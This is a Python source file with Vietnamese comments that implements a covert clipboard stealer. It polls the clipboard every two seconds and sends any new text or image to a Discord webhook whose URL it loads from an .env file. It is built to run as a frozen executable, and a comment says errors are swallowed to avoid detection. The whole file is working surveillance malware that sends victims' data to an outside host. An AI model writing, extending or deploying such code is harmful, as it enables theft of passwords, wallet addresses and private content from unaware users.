import io
import os
import sys
import time
import hashlib
import logging
import socket
from dotenv import load_dotenv
from dhooks import Webhook, File
from PIL import ImageGrab, UnidentifiedImageError
import pyperclip
import requests

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

env_path = os.path.join(base_path, '.env')
load_dotenv(env_path)
WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

if not WEBHOOK_URL:
    raise SystemExit()
hook = Webhook(WEBHOOK_URL)

MAX_TEXT_LENGTH = 1200

def get_public_ip(timeout=2):  # Giảm timeout để tăng tốc
    services = ("https://api.ipify.org?format=json",)  # Chỉ dùng 1 service để giảm tải
    for url in services:
        try:
            r = requests.get(url, timeout=timeout)
            if r.status_code == 200:
                j = r.json()
                return str(j.get("ip", "unknown"))
        except Exception:
            pass  # Im lặng để tránh phát hiện
    return "unknown"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "unknown"

def get_clipboard_hash():
    try:
        # Kiểm tra text trước vì nhanh hơn
        text = pyperclip.paste()
        if text and len(text.strip()) > 0:
            # Chỉ hash 1000 ký tự đầu để tăng tốc
            sample = text[:1000] if len(text) > 1000 else text
            return hashlib.md5(sample.encode("utf-8")).hexdigest()
    except Exception:
        pass
    
    try:
        img = ImageGrab.grabclipboard()
        if img and hasattr(img, "save"):
            # Chỉ hash kích thước ảnh thay vì toàn bộ dữ liệu
            size_info = f"{img.size}_{img.mode}"
            return hashlib.md5(size_info.encode("utf-8")).hexdigest()
        elif isinstance(img, list) and img:
            return hashlib.md5(str(len(img)).encode("utf-8")).hexdigest()
    except Exception:
        pass
    
    return None

def send_clipboard_with_ip():
    current_time = time.time()
    
    # Bỏ delay để log toàn bộ thông tin
    
    try:
        img = ImageGrab.grabclipboard()
    except Exception:
        img = None

    if img:
        try:
            with io.BytesIO() as buf:
                if hasattr(img, "save"):
                    # Nén ảnh để giảm kích thước
                    img.save(buf, format="JPEG", quality=70, optimize=True)
                else:
                    try:
                        from PIL import Image
                        pil_img = Image.open(img if isinstance(img, str) else img[0])
                        pil_img.save(buf, format="JPEG", quality=70, optimize=True)
                    except Exception:
                        return False
                buf.seek(0)
                
                # Kiểm tra kích thước file (giới hạn 5MB)
                if buf.getbuffer().nbytes > 5 * 1024 * 1024:
                    return False
                
                # Format với thời gian dễ đọc
                from datetime import datetime
                time_str = datetime.fromtimestamp(current_time).strftime("%H%M%S")
                date_str = datetime.fromtimestamp(current_time).strftime("%m%d")
                time_readable = datetime.fromtimestamp(current_time).strftime('%d/%m/%Y - %H:%M:%S')
                content = f"**Tập tin:** `{time_readable}`"
                file_obj = File(fp=buf, name=f"clipboard_{date_str}_{time_str}.jpg")
                hook.send(content, file=file_obj)
                return True
        except Exception:
            pass

    try:
        text = pyperclip.paste()
    except Exception:
        text = None

    if text and text.strip():
        # Giới hạn độ dài text
        preview = text[:MAX_TEXT_LENGTH]
        if len(text) > MAX_TEXT_LENGTH:
            preview += "..."
            
        # Format với thời gian dễ đọc  
        from datetime import datetime
        time_readable = datetime.fromtimestamp(current_time).strftime('%d/%m/%Y - %H:%M:%S')
        content = f"**Nội dung:** `{time_readable}`\n```\n{preview}\n```"
        try:
            hook.send(content)
            return True
        except Exception:
            pass

    return False

def watchdog_loop(interval: float = 2.0):
    last_hash = None
    error_count = 0
    
    while True:
        try:
            current_hash = get_clipboard_hash()
            if current_hash and current_hash != last_hash:
                sent = send_clipboard_with_ip()
                if sent:
                    last_hash = current_hash
                    error_count = 0
            
            # Adaptive interval - tăng delay khi có lỗi
            sleep_time = interval + (error_count * 2)
            time.sleep(min(sleep_time, 30))
            
        except KeyboardInterrupt:
            break
        except Exception:
            error_count += 1
            time.sleep(min(interval + error_count * 5, 60))

if __name__ == "__main__":
    watchdog_loop(interval=2.0)
